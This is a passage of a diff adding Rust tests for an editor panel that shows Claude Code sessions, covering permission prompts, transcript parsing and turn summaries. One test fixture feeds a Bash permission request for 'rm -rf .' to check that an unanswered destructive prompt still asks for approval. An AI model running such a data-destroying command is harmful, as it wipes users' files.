+        panel.update(cx, |panel, cx| {
+            panel
+                .pending_sends
+                .remember("session-b", "waiting here", &[]);
+            panel.rebuild_entries(cx);
+        });
+        panel.read_with(cx, |panel, _| {
+            assert!(
+                panel.pending_sends.session_transcript_walks > walks_with_foreign_failed,
+                "an in-flight row of the selected session must still walk the transcript"
+            );
+        });
+    }
+
+    /// A scan that replaces pid41 A→B and pid42 B→C records only the selected pid's
+    /// pair. The row keyed A follows pid41 to B; a row keyed B, sent to pid42, stays on
+    /// B because that pid was not selected.
+    #[gpui::test]
+    async fn a_row_follows_its_own_pid_through_clear_not_another_pids(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let mut session_a = scripted_registered_session();
+        session_a.session_id = "session-a".to_string();
+        session_a.process_id = 41;
+        let mut session_b = scripted_registered_session();
+        session_b.session_id = "session-b".to_string();
+        session_b.process_id = 42;
+        let source = Arc::new(
+            ScriptedSource::new(&[], &[]).with_sessions(vec![session_a.clone(), session_b.clone()]),
+        );
+        let panel = scripted_panel_over(source.clone(), cx);
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+        panel.update(cx, |panel, cx| {
+            panel.select_session("session-a".to_string(), cx)
+        });
+        cx.run_until_parked();
+
+        let (row_for_pid41, row_for_pid42) = panel.update(cx, |panel, cx| {
+            let row_for_pid41 = panel.pending_sends.remember("session-a", "for pid41", &[]);
+            let row_for_pid42 = panel.pending_sends.remember("session-b", "for pid42", &[]);
+            panel.rebuild_entries(cx);
+            (row_for_pid41, row_for_pid42)
+        });
+
+        let mut rebound_b = session_a;
+        rebound_b.session_id = "session-b".to_string();
+        let mut session_c = session_b;
+        session_c.session_id = "session-c".to_string();
+        source.set_sessions(vec![rebound_b, session_c]);
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+
+        panel.read_with(cx, |panel, cx| {
+            assert_eq!(
+                panel.store.read(cx).selected(),
+                Some("session-b"),
+                "selection follows pid41, not pid42's /clear"
+            );
+            let send_for_pid41 = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == row_for_pid41)
+                .expect("the row keyed A survives /clear");
+            assert_eq!(
+                send_for_pid41.session_id.as_str(),
+                "session-b",
+                "the row keyed A follows pid41 to B"
+            );
+            assert_eq!(
+                send_for_pid41.error, None,
+                "the rebound row is still in flight, not failed"
+            );
+            let send_for_pid42 = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == row_for_pid42)
+                .expect("the row keyed B survives the other pid's /clear");
+            assert_eq!(
+                send_for_pid42.session_id.as_str(),
+                "session-b",
+                "pid42 was not selected, so its clear is not recorded and the row stays on B"
+            );
+            assert_eq!(send_for_pid42.error, None);
+        });
+    }
+
+    /// The two prompts of one turn can land in a single poll: the tool the reader allowed
+    /// finishes and the next permission is asked for before the next read. The second
+    /// prompt has not been answered by anyone, so it must draw its own buttons.
+    #[gpui::test]
+    async fn a_second_permission_prompt_is_not_drawn_as_already_answered(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let source = Arc::new(PromptSource::new());
+        let panel = scripted_panel_over(source.clone(), cx);
+        read_the_scripted_session(&panel, cx);
+        let asked_at_ms = now_millis();
+        source.deliver(
+            &[hook_event_line(
+                asked_at_ms,
+                "PermissionRequest",
+                serde_json::json!({
+                    "tool_use_id": "toolu_first",
+                    "tool_name": "Bash",
+                    "tool_input": { "command": "ls" },
+                }),
+            )],
+            &[serde_json::json!({
+                "kind": "permission_request",
+                "at_ms": asked_at_ms,
+                "request_id": "aaaaa",
+                "tool_name": "Bash",
+                "description": "run ls",
+                "input_preview": "ls",
+            })
+            .to_string()],
+        );
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+
+        panel.update(cx, |panel, cx| {
+            let open = panel.store.read(cx).open_permission_request_id();
+            assert_eq!(
+                open.as_deref(),
+                Some("aaaaa"),
+                "the first prompt must be answerable before it is answered; expected \
+                 Some(\"aaaaa\"), got {open:?}"
+            );
+            panel.answer_permission(true, cx);
+        });
+        cx.run_until_parked();
+        panel.read_with(cx, |panel, _| {
+            assert!(
+                panel.permission_answered,
+                "the answered card is what the reader sees until the session moves on"
+            );
+        });
+
+        let second_at_ms = asked_at_ms + 200;
+        source.deliver(
+            &[
+                hook_event_line(
+                    second_at_ms,
+                    "PostToolUse",
+                    serde_json::json!({
+                        "tool_use_id": "toolu_first",
+                        "tool_name": "Bash",
+                    }),
+                ),
+                hook_event_line(
+                    second_at_ms,
+                    "PermissionRequest",
+                    serde_json::json!({
+                        "tool_use_id": "toolu_second",
+                        "tool_name": "Bash",
+                        "tool_input": { "command": "rm -rf ." },
+                    }),
+                ),
+            ],
+            &[serde_json::json!({
+                "kind": "permission_request",
+                "at_ms": second_at_ms,
+                "request_id": "bbbbb",
+                "tool_name": "Bash",
+                "description": "delete everything",
+                "input_preview": "rm -rf .",
+            })
+            .to_string()],
+        );
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+
+        let (answered, open) = panel.update(cx, |panel, cx| {
+            (
+                panel.permission_answered,
+                panel.store.read(cx).open_permission_request_id(),
+            )
+        });
+        assert_eq!(
+            open.as_deref(),
+            Some("bbbbb"),
+            "the second prompt is the one waiting; expected Some(\"bbbbb\"), got {open:?}"
+        );
+        assert!(
+            !answered,
+            "a prompt nobody has answered must draw Allow and Deny; expected \
+             permission_answered false, got {answered}"
+        );
+    }
+
+    /// Ticks are keyed by position, so a question that arrives in the same poll that
+    /// takes the answered one away would come up with the last question's boxes ticked
+    /// and submit an answer the reader never made.
+    #[gpui::test]
+    async fn a_second_question_does_not_inherit_the_ticks_of_the_first(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let source = Arc::new(PromptSource::new());
+        let panel = scripted_panel_over(source.clone(), cx);
+        read_the_scripted_session(&panel, cx);
+        let asked_at_ms = now_millis();
+        source.deliver(
+            &[hook_event_line(
+                asked_at_ms,
+                "PreToolUse",
+                serde_json::json!({
+                    "tool_use_id": "toolu_question_one",
+                    "tool_name": "AskUserQuestion",
+                    "tool_input": {
+                        "questions": [{
+                            "header": "Extras",
+                            "question": "Which extras?",
+                            "multiSelect": true,
+                            "options": [{ "label": "CodeGraph" }, { "label": "Tests" }],
+                        }],
+                    },
+                }),
+            )],
+            &[],
+        );
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+        panel.update(cx, |panel, _| {
+            panel.question_ticks.insert((0, 1));
+        });
+
+        let second_at_ms = asked_at_ms + 200;
+        source.deliver(
+            &[
+                hook_event_line(
+                    second_at_ms,
+                    "PostToolUse",
+                    serde_json::json!({
+                        "tool_use_id": "toolu_question_one",
+                        "tool_name": "AskUserQuestion",
+                    }),
+                ),
+                hook_event_line(
+                    second_at_ms,
+                    "PreToolUse",
+                    serde_json::json!({
+                        "tool_use_id": "toolu_question_two",
+                        "tool_name": "AskUserQuestion",
+                        "tool_input": {
+                            "questions": [{
+                                "header": "Cleanup",
+                                "question": "Delete what?",
+                                "multiSelect": true,
+                                "options": [
+                                    { "label": "Nothing" },
+                                    { "label": "The whole branch" },
+                                ],
+                            }],
+                        },
+                    }),
+                ),
+            ],
+            &[],
+        );
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+
+        let (asking, ticks) = panel.update(cx, |panel, cx| {
+            (
+                panel
+                    .store
+                    .read(cx)
+                    .live()
+                    .pending_question
+                    .as_ref()
+                    .map(|question| question.tool_use_id.clone()),
+                panel.question_ticks.clone(),
+            )
+        });
+        assert_eq!(
+            asking.as_deref(),
+            Some("toolu_question_two"),
+            "the second question is the one waiting; expected \
+             Some(\"toolu_question_two\"), got {asking:?}"
+        );
+        assert!(
+            ticks.is_empty(),
+            "a tick belongs to the question it was made on; expected no ticks on the \
+             second question, got {ticks:?}"
+        );
+    }
+
+    fn tool_use_block(name: &str, input: Value) -> Value {
+        serde_json::json!({ "name": name, "input": input })
+    }
+
+    #[test]
+    fn a_peer_record_is_a_peer_message_not_you() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","isMeta":true,"origin":{"kind":"peer","from":"Explore"},"promptSource":"system","message":{"content":"Another Claude session sent a message:\n<agent-message from=\"Explore\">hello from peer</agent-message>"}}"#,
+        ]);
+        assert_eq!(entries.len(), 1);
+        match &entries[0].kind {
+            EntryKind::Message { role, source, .. } => {
+                assert!(
+                    matches!(role, MessageRole::Peer { from } if from.as_deref() == Some("Explore")),
+                    "peer origin must not be labelled as the reader"
+                );
+                assert_eq!(role.label().as_ref(), "Message from Explore");
+                assert_eq!(source.as_ref(), "hello from peer");
+            }
+            _ => panic!("expected a peer message"),
+        }
+    }
+
+    #[test]
+    fn a_channel_record_is_the_readers_own_message() {
+        let typed = "可以了 channel connected";
+        let entries = entries_of(&[&channel_record_line(
+            "ff1c744b-channel",
+            &channel_envelope(typed),
+        )]);
+        assert_eq!(entries.len(), 1, "a channel record is one message");
+        match &entries[0].kind {
+            EntryKind::Message { role, source, .. } => {
+                assert_eq!(role, &MessageRole::User, "it is the reader's own words");
+                assert_eq!(source.as_ref(), typed);
+            }
+            other => panic!(
+                "expected a user message, got {}",
+                match other {
+                    EntryKind::Unknown { label, .. } => label.to_string(),
+                    _ => "a different entry".to_string(),
+                }
+            ),
+        }
+        assert!(
+            !entries.iter().any(entry_holds_channel_open),
+            "no <channel survives in the drawn entries; sources: {:?}",
+            message_sources(&entries)
+        );
+    }
+
+    #[test]
+    fn a_channel_record_keeps_an_inner_closing_tag() {
+        let typed = "before </channel> after";
+        let entries = entries_of(&[&channel_record_line("a", &channel_envelope(typed))]);
+        match &entries[0].kind {
+            EntryKind::Message { role, source, .. } => {
+                assert_eq!(role, &MessageRole::User);
+                assert_eq!(
+                    source.as_ref(),
+                    typed,
+                    "a quoted </channel> is part of the message, not the wrapper"
+                );
+            }
+            _ => panic!("expected a user message"),
+        }
+    }
+
+    #[test]
+    fn a_channel_record_that_is_not_wrapped_is_drawn_unchanged() {
+        let typed = "plain words, not wrapped";
+        let entries = entries_of(&[&channel_record_line("a", typed)]);
+        match &entries[0].kind {
+            EntryKind::Message { role, source, .. } => {
+                assert_eq!(role, &MessageRole::User);
+                assert_eq!(source.as_ref(), typed);
+            }
+            _ => panic!("expected a user message"),
+        }
+    }
+
+    /// The outermost wrapper is the envelope and everything inside it is the message, so
+    /// a reader quoting a whole `<channel …>…</channel>` gets it back byte for byte.
+    #[test]
+    fn a_channel_record_keeps_a_whole_envelope_the_reader_quoted() {
+        let typed = "use <channel source=\"zed-claude\" from=\"zed\">like this</channel> to send";
+        let entries = entries_of(&[&channel_record_line("a", &channel_envelope(typed))]);
+        match &entries[0].kind {
+            EntryKind::Message { role, source, .. } => {
+                assert_eq!(role, &MessageRole::User);
+                assert_eq!(
+                    source.as_ref(),
+                    typed,
+                    "only the outermost envelope is the wrapper"
+                );
+            }
+            _ => panic!("expected a user message"),
+        }
+    }
+
+    /// Reading `origin.kind == "channel"` as the reader's own must not have moved anything
+    /// else: a peer's hand-back, a task notification, and a record that is nothing but
+    /// context the CLI injected all keep the role and the visibility they had.
+    #[test]
+    fn only_the_channel_origin_became_the_readers_own() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","origin":{"kind":"peer","from":"Explore"},"message":{"content":"hello from peer"}}"#,
+            r#"{"type":"user","uuid":"b","origin":{"kind":"task-notification"},"promptSource":"system","message":{"content":"<task-notification>\n<task-id>t1</task-id>\n</task-notification>"}}"#,
+            r#"{"type":"user","uuid":"c","promptSource":"system","message":{"content":"injected context, no origin"}}"#,
+            &channel_record_line("d", &channel_envelope("mine")),
+        ]);
+
+        let mine: Vec<SharedString> = user_messages(&entries)
+            .into_iter()
+            .map(|(_, source)| source)
+            .collect();
+        assert_eq!(
+            mine,
+            vec![SharedString::from("mine")],
+            "only the channel record is the reader's own"
+        );
+        assert!(
+            entries.iter().any(|entry| matches!(
+                &entry.kind,
+                EntryKind::Message {
+                    role: MessageRole::Peer { from },
+                    ..
+                } if from.as_deref() == Some("Explore")
+            )),
+            "the peer hand-back is still the peer's; entries: {:?}",
+            message_sources(&entries)
+        );
+        assert!(
+            entries.iter().any(|entry| matches!(
+                &entry.kind,
+                EntryKind::Message {
+                    role: MessageRole::System,
+                    source,
+                    ..
+                } if source.as_ref() == "injected context, no origin"
+            )),
+            "a promptSource=system record with no origin is still the session's own \
+             context; entries: {:?}",
+            message_sources(&entries)
+        );
+    }
+
+    #[test]
+    fn a_task_notification_record_is_not_a_message() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","origin":{"kind":"task-notification"},"promptSource":"system","message":{"content":"<task-notification>\n<task-id>byygs214e</task-id>\n<status>completed</status>\n</task-notification>"}}"#,
+        ]);
+        assert!(
+            message_sources(&entries).is_empty(),
+            "a task-notification is not a message anyone typed"
+        );
+    }
+
+    #[test]
+    fn a_task_notification_with_system_text_goes_to_context() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","origin":{"kind":"task-notification"},"promptSource":"system","message":{"content":"[SYSTEM NOTIFICATION]\nidle\n<task-notification>\n<task-id>t1</task-id>\n</task-notification>"}}"#,
+        ]);
+        assert!(message_sources(&entries).is_empty());
+        let items = entries.iter().find_map(|entry| match &entry.kind {
+            EntryKind::Attachments { items } => Some(items),
+            _ => None,
+        });
+        let Some(items) = items else {
+            panic!("the leftover system notification belongs in Context");
+        };
+        assert!(
+            items.iter().any(|item| item.body.contains("idle")),
+            "got {:?}",
+            items
+                .iter()
+                .map(|item| item.body.as_ref())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn a_human_typed_record_is_the_reader() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","origin":{"kind":"human"},"promptSource":"typed","message":{"content":"hello"}}"#,
+        ]);
+        match &entries[0].kind {
+            EntryKind::Message { role, .. } => assert_eq!(role, &MessageRole::User),
+            _ => panic!("expected a user message"),
+        }
+    }
+
+    #[test]
+    fn a_legacy_record_without_origin_fields_keeps_todays_behaviour() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","message":{"content":"hello"}}"#,
+            r#"{"type":"user","uuid":"b","isMeta":true,"message":{"content":"injected"}}"#,
+        ]);
+        assert_eq!(message_sources(&entries), vec![SharedString::from("hello")]);
+    }
+
+    #[test]
+    fn away_summary_is_a_system_note() {
+        let entries = entries_of(&[
+            r#"{"type":"system","subtype":"away_summary","uuid":"a","content":"you missed two replies"}"#,
+        ]);
+        match &entries[0].kind {
+            EntryKind::SystemNote { subtype, text, url } => {
+                assert_eq!(subtype.as_ref(), "away_summary");
+                assert_eq!(text.as_ref(), "you missed two replies");
+                assert!(url.is_none());
+            }
+            _ => panic!("expected a system note"),
+        }
+    }
+
+    #[test]
+    fn bridge_status_is_a_system_note_with_a_url() {
+        let entries = entries_of(&[
+            r#"{"type":"system","subtype":"bridge_status","uuid":"a","content":"connected","url":"https://claude.ai/code/session_01"}"#,
+        ]);
+        match &entries[0].kind {
+            EntryKind::SystemNote { subtype, url, .. } => {
+                assert_eq!(subtype.as_ref(), "bridge_status");
+                assert_eq!(url.as_deref(), Some("https://claude.ai/code/session_01"));
+            }
+            _ => panic!("expected a system note with a url"),
+        }
+    }
+
+    #[test]
+    fn an_unknown_system_subtype_without_content_is_raw_json() {
+        let entries = entries_of(&[r#"{"type":"system","subtype":"future_note","uuid":"a"}"#]);
+        match &entries[0].kind {
+            EntryKind::Unknown { label, raw } => {
+                assert_eq!(label.as_ref(), "system / future_note");
+                assert!(raw.contains("future_note"));
+            }
+            _ => panic!("expected unrecognized JSON"),
+        }
+    }
+
+    #[test]
+    fn a_stop_hook_summary_is_not_drawn() {
+        let entries = entries_of(&[
+            r#"{"type":"system","subtype":"stop_hook_summary","hookCount":1,"hookInfos":[{"command":"'/Users/andy/.claude/hooks/zed-claude-events.sh'","durationMs":62}],"hookErrors":[],"hookAdditionalContext":[],"preventedContinuation":false,"stopReason":"","hasOutput":false,"level":"suggestion","timestamp":"2026-09-18T13:43:20.174Z","uuid":"stop-hook","toolUseID":"toolu_stop"}"#,
+            r#"{"type":"system","subtype":"away_summary","uuid":"b","content":"you missed two replies"}"#,
+            r#"{"type":"system","subtype":"future_note","uuid":"c"}"#,
+        ]);
+        assert_eq!(
+            entries.len(),
+            2,
+            "stop_hook_summary draws nothing; the other two records stay; keys: {:?}",
+            entries.iter().map(|entry| &entry.key).collect::<Vec<_>>()
+        );
+        match &entries[0].kind {
+            EntryKind::SystemNote { subtype, text, .. } => {
+                assert_eq!(subtype.as_ref(), "away_summary");
+                assert_eq!(text.as_ref(), "you missed two replies");
+            }
+            _ => panic!("a system record that carries content still draws its note"),
+        }
+        match &entries[1].kind {
+            EntryKind::Unknown { label, .. } => {
+                assert_eq!(label.as_ref(), "system / future_note");
+            }
+            _ => panic!("an unknown subtype with no content still draws Unrecognized"),
+        }
+    }
+
+    /// The record is dropped because it is bookkeeping with nothing in it. A hook that
+    /// printed something for the reader writes that into this same record, and no other
+    /// record holds it.
+    #[test]
+    fn a_stop_hook_summary_that_carries_content_still_draws_its_note() {
+        let entries = entries_of(&[
+            r#"{"type":"system","subtype":"stop_hook_summary","uuid":"a","hookCount":1,
+"hasOutput":true,"content":"the release hook refused: the tree is dirty"}"#,
+        ]);
+        match entries.first().map(|entry| &entry.kind) {
+            Some(EntryKind::SystemNote { subtype, text, .. }) => {
+                assert_eq!(subtype.as_ref(), "stop_hook_summary");
+                assert_eq!(text.as_ref(), "the release hook refused: the tree is dirty");
+            }
+            other => panic!(
+                "expected one SystemNote carrying \"the release hook refused: the tree \
+                 is dirty\"; got {} entries, the first being {}",
+                entries.len(),
+                match other {
+                    None => "nothing at all".to_string(),
+                    Some(EntryKind::Unknown { label, .. }) => format!("Unrecognized {label}"),
+                    Some(_) => "another kind of entry".to_string(),
+                }
+            ),
+        }
+    }
+
+    #[test]
+    fn tokens_left_is_formatted_in_millions() {
+        assert_eq!(tokens_left_quantity(15_000_000), "15.0M");
+        assert_eq!(tokens_left_quantity(987_000), "987K");
+        assert_eq!(tokens_left_quantity(12_300), "12.3K");
+        assert_eq!(tokens_left_fact(15_000_000).as_ref(), "15.0M tokens left");
+    }
+
+    fn test_status_snapshot() -> StatusSnapshot {
+        StatusSnapshot {
+            model_id: None,
+            model_display_name: None,
+            context_window_size: None,
+            context_used_percentage: None,
+            total_input_tokens: None,
+            total_output_tokens: None,
+            total_cost_usd: None,
+            effort: None,
+            five_hour_used_percentage: None,
+            five_hour_resets_at: None,
+            seven_day_used_percentage: None,
+            seven_day_resets_at: None,
+            exceeds_200k_tokens: None,
+        }
+    }
+
+    fn user_turn_entry(uuid: &str, text: &str) -> Entry {
+        Entry {
+            key: SharedString::from(uuid),
+            kind: EntryKind::Message {
+                role: MessageRole::User,
+                source: SharedString::from(text),
+                usage: None,
+                answered_at: None,
+            },
+        }
+    }
+
+    fn assistant_turn_entry(uuid: &str, text: &str) -> Entry {
+        Entry {
+            key: SharedString::from(uuid),
+            kind: EntryKind::Message {
+                role: MessageRole::Assistant,
+                source: SharedString::from(text),
+                usage: None,
+                answered_at: None,
+            },
+        }
+    }
+
+    fn peer_turn_entry(uuid: &str) -> Entry {
+        Entry {
+            key: SharedString::from(uuid),
+            kind: EntryKind::Message {
+                role: MessageRole::Peer { from: None },
+                source: SharedString::from("from a peer"),
+                usage: None,
+                answered_at: None,
+            },
+        }
+    }
+
+    fn tool_use_turn_entry(key: &str, name: &str, input: Value, id: &str) -> Entry {
+        Entry {
+            key: SharedString::from(key),
+            kind: EntryKind::ToolUse {
+                name: SharedString::from(name),
+                input: SharedString::from(input.to_string()),
+                id: Some(SharedString::from(id)),
+                diff: None,
+            },
+        }
+    }
+
+    fn tool_result_turn_entry(key: &str) -> Entry {
+        Entry {
+            key: SharedString::from(key),
+            kind: EntryKind::ToolResult {
+                label: SharedString::from("Write"),
+                is_error: false,
+                body: ToolResultBody::Inline(SharedString::from("ok")),
+            },
+        }
+    }
+
+    fn turn_footer_entry(key: &str, duration_ms: u64) -> Entry {
+        Entry {
+            key: SharedString::from(key),
+            kind: EntryKind::TurnFooter {
+                duration_ms,
+                message_count: 2,
+                pending_background_agents: 0,
+            },
+        }
+    }
+
+    #[test]
+    fn collapse_turns_summarises_finished_turns_and_keeps_the_running_one_open() {
+        let write_a = serde_json::json!({ "file_path": "/a.rs" });
+        let write_b = serde_json::json!({ "file_path": "/b.rs" });
+        let write_a_again = serde_json::json!({ "file_path": "/a.rs" });
+        let entries = vec![
+            user_turn_entry("u1", "one"),
+            tool_use_turn_entry("u1#0", "Write", write_a, "t1"),
+            tool_result_turn_entry("u1#1"),
+            tool_use_turn_entry("u1#2", "Write", write_b, "t2"),
+            turn_footer_entry("u1#f", 41_000),
+            user_turn_entry("u2", "two"),
+            tool_use_turn_entry("u2#0", "Agent", serde_json::json!({ "prompt": "go" }), "t3"),
+            tool_use_turn_entry("u2#1", "Write", write_a_again, "t4"),
+            turn_footer_entry("u2#f", 12_000),
+            user_turn_entry("u3", "three"),
+            tool_use_turn_entry(
+                "u3#0",
+                "Read",
+                serde_json::json!({ "file_path": "/c.rs" }),
+                "t5",
+            ),
+        ];
+        let mut agent_calls = HashMap::default();
+        agent_calls.insert(
+            SharedString::from("u2#0"),
+            AgentCall {
+                tool_use_id: SharedString::from("t3"),
+                is_workflow: false,
+            },
+        );
+
+        let collapsed = collapse_turns(
+            entries.clone(),
+            &HashSet::default(),
+            false,
+            true,
+            &agent_calls,
+            &HashMap::default(),
+        );
+
+        let summaries: Vec<_> = collapsed
+            .iter()
+            .filter_map(|entry| match &entry.kind {
+                EntryKind::TurnSummary {
+                    turn_id,
+                    calls,
+                    files_edited,
+                    agents,
+                    duration_ms,
+                    is_expanded,
+                    ..
+                } => Some((
+                    turn_id.as_ref(),
+                    *calls,
+                    files_edited.len(),
+                    *agents,
+                    *duration_ms,
+                    *is_expanded,
+                )),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            summaries,
+            vec![
+                ("u1", 2, 2, 0, Some(41_000), false),
+                ("u2", 2, 1, 1, Some(12_000), false),
+            ],
+            "finished turns collapse; the running turn has no summary: {summaries:?}"
+        );
+        assert!(
+            collapsed.iter().any(|entry| entry.key.as_ref() == "u3#0"),
+            "the current running turn keeps its tool entries"
+        );
+        assert!(
+            !collapsed.iter().any(|entry| matches!(
+                &entry.kind,
+                EntryKind::TurnSummary { turn_id, .. } if turn_id.as_ref() == "u3"
+            )),
+            "the current running turn is not summarised"
+        );
+
+        let mut expanded = HashSet::default();
+        expanded.insert(SharedString::from("u1"));
+        let restored = collapse_turns(
+            entries,
+            &expanded,
+            false,
+            true,
+            &agent_calls,
+            &HashMap::default(),
+        );
+        assert!(
+            restored.iter().any(|entry| entry.key.as_ref() == "u1#0"),
+            "expanding a turn restores its tool entries in place"
+        );
+        assert!(
+            restored.iter().any(|entry| matches!(
+                &entry.kind,
+                EntryKind::TurnSummary { turn_id, is_expanded: true, .. }
+                    if turn_id.as_ref() == "u1"
+            )),
+            "an expanded turn keeps a header so it can be collapsed again"
+        );
+
+        let keys = live_cache_keys(&collapsed);
+        assert!(
+            keys.contains(&SharedString::from("u1#summary")),
+            "turn-summary keys survive a rebuild: {keys:?}"
+        );
+
+        let no_tools = vec![
+            user_turn_entry("plain", "just words"),
+            assistant_turn_entry("plain-a", "a reply"),
+        ];
+        let unchanged = collapse_turns(
+            no_tools.clone(),
+            &HashSet::default(),
+            false,
+            false,
+            &HashMap::default(),
+            &HashMap::default(),
+        );
+        assert_eq!(unchanged.len(), no_tools.len());
+        assert!(
+            unchanged
+                .iter()
+                .all(|entry| !matches!(entry.kind, EntryKind::TurnSummary { .. })),
+            "zero tool calls produce no summary line"
+        );
+
+        let with_peer = vec![
+            user_turn_entry("u1", "start"),
+            peer_turn_entry("peer"),
+            tool_use_turn_entry(
+                "peer#0",
+                "Write",
+                serde_json::json!({ "file_path": "/x.rs" }),
+                "tp",
+            ),
+            user_turn_entry("u2", "next"),
+        ];
+        let collapsed_peer = collapse_turns(
+            with_peer,
+            &HashSet::default(),
+            false,
+            false,
+            &HashMap::default(),
+            &HashMap::default(),
+        );
+        assert!(
+            collapsed_peer.iter().any(|entry| matches!(
+                &entry.kind,
+                EntryKind::TurnSummary { turn_id, calls: 1, .. } if turn_id.as_ref() == "u1"
+            )),
+            "a Peer message does not start a turn; the Write belongs to u1: {:?}",
+            collapsed_peer
+                .iter()
+                .map(|entry| entry.key.to_string())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn now_row_picks_the_newest_tool_then_thinking_then_nothing() {
+        let older = RunningTool {
+            tool_use_id: "old".into(),
+            name: "Read".into(),
+            input: serde_json::json!({ "file_path": "/old.rs" }),
+            started_at_ms: 1,
+        };
+        let newer = RunningTool {
+            tool_use_id: "new".into(),
+            name: "Write".into(),
+            input: serde_json::json!({ "file_path": "/new.rs" }),
+            started_at_ms: 2,
+        };
+        let mut live = LiveState::default();
+        live.last_event_at_ms = 10;
+        live.running_tools = vec![older, newer];
+        live.turn = Turn::Running { since_ms: 1 };
+        match now_row(&live, &Activity::Idle) {
+            Some(NowRow::Tool {
+                tool_use_id, name, ..
+            }) => {
+                assert_eq!(tool_use_id, "new");
+                assert_eq!(name.as_ref(), "Write");
+            }
+            other => panic!("expected the newest running tool, got {other:?}"),
+        }
+
+        live.running_tools.clear();
+        match now_row(&live, &Activity::Idle) {
+            Some(NowRow::Thinking { since_ms }) => assert_eq!(since_ms, Some(1)),
+            other => panic!("expected the thinking note, got {other:?}"),
+        }
+
+        live.turn = Turn::Idle;
+        assert_eq!(now_row(&live, &Activity::Idle), None);
+
+        live.last_event_at_ms = 0;
+        let fallback = Activity::RunningTool {
+            name: SharedString::from("Bash"),
+            target: SharedString::from("ls"),
+        };
+        match now_row(&live, &fallback) {
+            Some(NowRow::Tool { name, target, .. }) => {
+                assert_eq!(name.as_ref(), "Bash");
+                assert_eq!(target.as_ref(), "ls");
+            }
+            other => panic!("expected the transcript activity fallback, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn context_meter_uses_status_percentage_and_color_bands() {
+        let spend = Spend {
+            context_tokens: 108_000,
+            ..Default::default()
+        };
+        let mut status = test_status_snapshot();
+        status.context_used_percentage = Some(54.);
+        status.context_window_size = Some(200_000);
+        let meter = context_meter(Some(&status), &spend, false).expect("meter");
+        assert_eq!(meter.fill, Some(0.54));
+        assert!(meter.label.as_ref().contains('%'), "{}", meter.label);
+        assert_eq!(context_meter_color(59.), Color::Muted);
+        assert_eq!(context_meter_color(60.), Color::Warning);
+        assert_eq!(context_meter_color(85.), Color::Warning);
+        assert_eq!(context_meter_color(86.), Color::Error);
+
+        let unknown_window = Spend {
+            context_tokens: 108_000,
+            ..Default::default()
+        };
+        let meter = context_meter(None, &unknown_window, false).expect("number only");
+        assert_eq!(meter.fill, None);
+        assert!(
+            meter.label.as_ref().contains("ctx"),
+            "window unknown is a number only: {}",
+            meter.label
+        );
+
+        let compacted = Spend {
+            context_tokens: 14_000,
+            context_is_post_compaction: true,
+            ..Default::default()
+        };
+        let meter = context_meter(None, &compacted, true).expect("compacted");
+        let tooltip = meter.tooltip.expect("tooltip");
+        assert!(tooltip.contains("(compacted)"));
+        assert!(tooltip.contains("compacting…"));
+    }
+
+    #[test]
+    fn saying_visibility_and_height_and_markdown_key() {
+        let mut live = LiveState::default();
+        assert!(!live_message_is_visible(&live, 1_000));
+
+        live.live_message = Some(LiveMessage {
+            turn_id: None,
+            message_id: Some("m1".into()),
+            text: "hello".into(),
+            is_final: false,
+            updated_at_ms: 1_000,
+        });
+        live.turn = Turn::Idle;
+        assert!(live_message_is_visible(&live, 1_000));
+        assert!(!live_message_is_visible(
+            &live,
+            1_000 + LIVE_MESSAGE_STALE_MS + 1
+        ));
+        live.turn = Turn::Running { since_ms: 1 };
+        assert!(live_message_is_visible(
+            &live,
+            1_000 + LIVE_MESSAGE_STALE_MS + 1
+        ));
+
+        assert_eq!(live_message_markdown_key(Some("m1")).as_ref(), "live:m1");
+        assert_ne!(
+            live_message_markdown_key(Some("m1")),
+            live_message_markdown_key(Some("m2"))
+        );
+
+        let rem = px(16.);
+        let panel = px(400.);
+        assert_eq!(
+            clamp_live_message_height(px(10.), rem, panel),
+            rem * LIVE_MESSAGE_MIN_HEIGHT_REMS
+        );
+        let requested = panel * 0.9;
+        assert_eq!(
+            clamp_live_message_height(requested, rem, panel),
+            panel * LIVE_MESSAGE_HEIGHT_PANEL_FRACTION
+        );
+    }
+
+    #[test]
+    fn a_second_interrupt_within_five_seconds_is_suppressed() {
+        assert!(
+            interrupt_is_awaiting_result(Some(1_000), 1_001),
+            "a click 1ms after Stop must not queue a second outbox file"
+        );
+        assert!(
+            !interrupt_is_awaiting_result(None, 1_000),
+            "the first Stop must still send; expected awaiting=false with no prior send"
+        );
+        assert!(
+            !interrupt_is_awaiting_result(Some(1_000), 1_000 + INTERRUPT_SENT_MS),
+            "after 5s a still-running turn may send again; that retry must not be refused"
+        );
+    }
+
+    #[test]
+    fn format_elapsed_mm_ss_clamps_negative_and_caps_display() {
+        assert_eq!(
+            format_elapsed_mm_ss(-50),
+            "0:00",
+            "a host clock ahead of local now must not show negative elapsed"
+        );
+        assert_eq!(format_elapsed_mm_ss(90_000), "1:30");
+        assert_eq!(
+            format_elapsed_mm_ss(100_000_000_000),
+            "99:59",
+            "a skewed remote clock must not render millions of minutes, got {}",
+            format_elapsed_mm_ss(100_000_000_000)
+        );
+    }
+
+    #[test]
+    fn context_meter_clamps_percentage_to_zero_through_one_hundred() {
+        let spend = Spend {
+            context_tokens: 108_000,
+            ..Default::default()
+        };
+        let mut over = test_status_snapshot();
